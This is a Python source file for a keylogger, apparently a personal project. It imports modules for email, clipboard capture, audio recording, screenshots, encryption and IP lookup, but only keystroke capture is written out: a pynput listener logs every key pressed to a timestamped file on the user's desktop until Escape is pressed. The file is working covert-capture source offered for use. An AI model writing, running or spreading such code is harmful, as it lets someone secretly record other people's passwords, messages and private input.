# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import datetime

import socket
import platform

import pyperclip

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

log_filename = f"keylog_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
encryption_key = "encryption.key"

file_path = f"/Users/{getpass.getuser()}/Desktop/Key Stroke Identifer Project/"
extend = "/"

count = 0
keys = []

def key_on_press(key):
    global keys, count
    
    print(key)
    keys.append(key)
    count = count + 1
    
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []
    
    
def write_file(keys):
    with open(file_path + extend + log_filename, "a") as f: # a is append to log file
        for key in keys:
            k = str(key).replace("'", "") # prevent single quotes from naturually logged
            if k.find("space") > 0:  # Add a space for space key
                f.write(' ')
            if k.find("enter") > 0: # Adds new line for enter key
                f.write('\n')
                f.close()
            elif k.find("Key") == -1: # Print all other keys normally
                f.write(k)
                f.close()

#escape key exits the keylogger
def key_on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=key_on_press, on_release=key_on_release) as listener:
    listener.join()

